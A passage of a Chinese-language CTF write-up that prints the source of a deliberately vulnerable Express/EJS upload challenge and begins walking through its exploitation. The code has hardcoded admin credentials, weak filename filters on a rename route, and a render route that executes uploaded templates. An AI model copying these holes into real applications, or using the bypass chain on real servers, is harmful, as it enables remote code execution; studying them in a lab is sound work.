class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs=<span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParse = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createDirectoriesForFilePath</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> dirname = path.<span class="title function_">dirname</span>(filePath);</span><br><span class="line"></span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(dirname, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">IfLogin</span>(<span class="params">req, res, next</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">    <span class="attr">destination</span>: <span class="keyword">function</span> (<span class="params">req, file, cb</span>) &#123;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>)); <span class="comment">// 设置上传文件的目标目录</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">filename</span>: <span class="keyword">function</span> (<span class="params">req, file, cb</span>) &#123;</span><br><span class="line">        <span class="comment">// 直接使用原始文件名</span></span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置 multer 上传中间件</span></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123;</span><br><span class="line">    <span class="attr">storage</span>: storage, <span class="comment">// 使用自定义存储选项</span></span><br><span class="line">    <span class="attr">fileFilter</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> fileExt = path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line">        <span class="keyword">if</span> (fileExt === <span class="string">&#x27;.ejs&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Upload of .ejs files is not allowed&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>); <span class="comment">// 允许上传其他类型的文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">admin=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;ADMIN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">app=<span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParse.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="string">&#x27;Can_U_hack_me?&#x27;</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;you can not be admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> new_username = username.<span class="title function_">toUpperCase</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (new_username === admin.<span class="property">username</span> &amp;&amp; password === admin.<span class="property">password</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&quot;ADMIN&quot;</span>;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/rename&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// res.redirect(&#x27;/login&#x27;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;fileInput&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No file uploaded&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> fileExt = path.<span class="title function_">extname</span>(req.<span class="property">file</span>.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fileExt === <span class="string">&#x27;.ejs&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Upload of .ejs files is not allowed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;File uploaded successfully: &#x27;</span> + req.<span class="property">file</span>.<span class="property">originalname</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/render&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; filename &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Filename parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(filePath);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/rename&#x27;</span>,<span class="title class_">IfLogin</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> !== <span class="string">&#x27;ADMIN&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access forbidden&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; oldPath , newPath &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath || !newPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Missing oldPath or newPath&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newPath &amp;&amp; <span class="regexp">/app\.js|\\|\.ejs/i</span>.<span class="title function_">test</span>(newPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldPath &amp;&amp; <span class="regexp">/\.\.|flag/i</span>.<span class="title function_">test</span>(oldPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> new_file = newPath.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> oldFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldPath);</span><br><span class="line">    <span class="keyword">const</span> newFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, new_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (newFilePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;oldPath parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(oldFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Old file not found&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(newFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">409</span>).<span class="title function_">send</span>(<span class="string">&#x27;New file path already exists&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">createDirectoriesForFilePath</span>(newFilePath)</span><br><span class="line">    fs.<span class="title function_">rename</span>(oldFilePath, newFilePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error renaming file:&#x27;</span>, err);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error renaming file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;File renamed successfully&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;3000&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`http://localhost:3000`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>upload.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">//省略部分代码</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Upload a File<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fileInput&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;.txt, .pdf, .jpg, .png&quot;</span> <span class="attr">required</span>&gt;</span> <span class="comment">&lt;!-- 允许上传的文件类型 --&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Upload<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    &lt;% if (typeof errorMessage !== &#x27;undefined&#x27; &amp;&amp; errorMessage) &#123; %&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;error&quot;</span>&gt;</span>&lt;%= errorMessage %&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;% &#125; %&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>package.json</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;express-file-upload-app&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;description&quot;</span>: <span class="string">&quot;ezjs&quot;</span>,</span><br><span class="line">  <span class="string">&quot;main&quot;</span>: <span class="string">&quot;app.js&quot;</span>,</span><br><span class="line">  <span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;start&quot;</span>: <span class="string">&quot;node app.js&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;express&quot;</span>: <span class="string">&quot;^4.17.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ejs&quot;</span>: <span class="string">&quot;^3.1.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;express-session&quot;</span>: <span class="string">&quot;^1.17.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;body-parser&quot;</span>: <span class="string">&quot;^1.19.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;multer&quot;</span>: <span class="string">&quot;^1.4.4&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过package.json我们知道express和ejs的版本是存在利用的，配合文件上传实现Express engine处理引擎漏洞，而upload.js虽然限制上传文件类型，但是waf在前端可以抓包直接绕过。</p>
+<p>我们重点还是分析app.js</p>
+<p><code>/upload</code>路由实现文件上传功能</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;fileInput&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No file uploaded&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> fileExt = path.<span class="title function_">extname</span>(req.<span class="property">file</span>.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fileExt === <span class="string">&#x27;.ejs&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Upload of .ejs files is not allowed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;File uploaded successfully: &#x27;</span> + req.<span class="property">file</span>.<span class="property">originalname</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>调用<code>extname()</code>函数读取文件拓展名，限制了不准上传拓展名ejs的文件</p>
+<p><code>/render</code>实现模板渲染功能</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/render&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; filename &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Filename parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(filePath);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>接收参数文件名<code>filename</code>，然后进行拼接成文件路径，如果不为<code>.ejs</code>结尾那么对该文件进行渲染</p>
+<p><code>/rename</code>实现重命名文件的功能</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/rename&#x27;</span>,<span class="title class_">IfLogin</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> !== <span class="string">&#x27;ADMIN&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access forbidden&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; oldPath , newPath &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath || !newPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Missing oldPath or newPath&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newPath &amp;&amp; <span class="regexp">/app\.js|\\|\.ejs/i</span>.<span class="title function_">test</span>(newPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldPath &amp;&amp; <span class="regexp">/\.\.|flag/i</span>.<span class="title function_">test</span>(oldPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> new_file = newPath.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> oldFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldPath);</span><br><span class="line">    <span class="keyword">const</span> newFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, new_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (newFilePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;oldPath parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(oldFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Old file not found&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(newFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">409</span>).<span class="title function_">send</span>(<span class="string">&#x27;New file path already exists&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">createDirectoriesForFilePath</span>(newFilePath)</span><br><span class="line">    fs.<span class="title function_">rename</span>(oldFilePath, newFilePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error renaming file:&#x27;</span>, err);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error renaming file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;File renamed successfully&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>接收参数<code>oldPath</code>和<code>newPath</code></p>
+<ul>
+<li>检查 <code>newPath</code> 是否包含 <code>app.js</code>、<code>\</code>或者 <code>.ejs</code> 扩展名。如果包含这些模式，则返回一个状态码为 400 的错误响应</li>
+<li>检查 <code>oldPath</code> 是否包含 <code>..</code> 或者 <code>flag</code> 字符串。如果包含这些模式，则返回一个状态码为 400 的错误响应</li>
+</ul>
+<p>然后对旧文件名和新文件名分别进行路径拼接，检查文件路径是否以 <code>.ejs</code> 结尾。最后调用<code>rename()</code>对文件名进行重写</p>
+<p><strong>代码逻辑梳理清楚后，开始具体实现</strong></p>
+<p>我们用<code>ADMIN:123456</code>进行登录，访问<code>/upload</code>上传文件进行抓包，绕过前端检测</p>
+<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729203531653.png"></p>
